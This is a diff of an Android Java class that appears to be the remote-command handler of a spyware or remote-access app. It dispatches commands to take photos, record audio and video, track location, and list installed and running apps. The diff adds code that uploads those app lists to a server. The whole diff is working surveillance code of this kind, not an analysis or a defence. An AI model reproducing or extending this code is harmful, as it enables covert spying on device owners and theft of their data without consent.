@@ -4,12 +4,18 @@ import android.text.TextUtils;
 import android.util.SparseArray;
 
 import com.amap.api.location.AMapLocation;
+import com.fs.fs.api.network.ApiConfig;
+import com.fs.fs.api.network.core.BaseResponse;
+import com.fs.fs.api.network.core.HttpParams;
+import com.fs.fs.api.network.core.OkHttpUtils;
+import com.fs.fs.api.network.core.callback.HttpCallback;
 import com.fs.fs.bean.AppInfo;
 import com.fs.fs.utils.Constant;
-import com.fs.fs.utils.SharePreferencesUtils;
 
 import java.util.List;
 import java.util.Map;
+
+import okhttp3.Headers;
 
 /**
  * Created by wyx on 2017/1/7.
@@ -35,15 +41,27 @@ public class CmdThread extends Thread {
     @Override
     public void run() {
         try {
-            // TODO:close后能开吗
             String[] arr = mCmd.split("_");
             Constant.Command cmd = Constant.Command.valueOf(arr[1]);
+            String cameraIndex = null;
             switch (cmd) {
                 case app:
                     AppInfoService.getInstance().getInstallAppInfo(new AppInfoService.AppInfoListener() {
                         @Override
                         public void onSucceed(List<AppInfo> appInfos) {
+                            HttpParams httpParams = new HttpParams();
+                            httpParams.addJson("app_info", appInfos);
+                            OkHttpUtils.post(ApiConfig.getInstallAppInfo(), httpParams, new HttpCallback(BaseResponse.class) {
+                                @Override
+                                public void onSuccess(BaseResponse httpResponse, Headers headers) {
 
+                                }
+
+                                @Override
+                                public void onError(String errorMsg) {
+
+                                }
+                            });
                         }
                     });
                     break;
@@ -51,19 +69,28 @@ public class CmdThread extends Thread {
                     AppInfoService.getInstance().getRunningAppInfo(new AppInfoService.AppInfoListener() {
                         @Override
                         public void onSucceed(List<AppInfo> appInfos) {
+                            HttpParams httpParams = new HttpParams();
+                            httpParams.addJson("app_info", appInfos);
+                            OkHttpUtils.post(ApiConfig.getRunningAppInfo(), httpParams, new HttpCallback(BaseResponse.class) {
+                                @Override
+                                public void onSuccess(BaseResponse httpResponse, Headers headers) {
 
+                                }
+
+                                @Override
+                                public void onError(String errorMsg) {
+
+                                }
+                            });
                         }
                     });
                     break;
                 case photo:
-                    String cameraIndex = mMap.get("camera_index");
+                    cameraIndex = mMap.get("camera_index");
                     if (TextUtils.isEmpty(cameraIndex)) {
                         CameraService.getInstance().takePhoto(null);
                     } else {
-                        SparseArray<Integer> map = (SparseArray<Integer>) SharePreferencesUtils.getInstance().get(Constant.SHARE_KEYS.CAMERA, null);
-                        if (null == map) {
-                            map = DeviceService.getCameraInfo();
-                        }
+                        SparseArray<Integer> map = DeviceService.getCameraInfo();
                         Integer face = map.get(Integer.parseInt(cameraIndex));
                         if (null == face) {
                             CameraService.getInstance().takePhoto(null);
@@ -75,18 +102,32 @@ public class CmdThread extends Thread {
                 case audio:
                     MediaRecordService.getInstance().startRecordAudio();
                     break;
-                case video:
-                    MediaRecordService.getInstance().startRecordVideo();
+                case stop_audio:
+                    MediaRecordService.getInstance().stopRecordAudio();
                     break;
-                case stop_record:
-                    MediaRecordService.getInstance().stopRecord();
+                case video:
+                    cameraIndex = mMap.get("camera_index");
+                    if (TextUtils.isEmpty(cameraIndex)) {
+                        MediaRecordService.getInstance().startRecordVideo(null);
+                    } else {
+                        SparseArray<Integer> map = DeviceService.getCameraInfo();
+                        Integer face = map.get(Integer.parseInt(cameraIndex));
+                        if (null == face) {
+                            MediaRecordService.getInstance().startRecordVideo(null);
+                        } else {
+                            MediaRecordService.getInstance().startRecordVideo(Integer.valueOf(cameraIndex));
+                        }
+                    }
+                    break;
+                case stop_video:
+                    MediaRecordService.getInstance().stopRecordVideo();
                     break;
                 case locate_on:
                     LocationService.getInstance().close();
                     LocationService.getInstance().once(new LocationService.LocateListener() {
                         @Override
                         public void onLocateSucceed(AMapLocation aMapLocation) {
-
+                            //TODO:看server需要
                         }
 
                         @Override
@@ -128,7 +169,7 @@ public class CmdThread extends Thread {
                     }
             }
         } catch (Exception e) {
-
+            e.printStackTrace();
         }
     }
 }
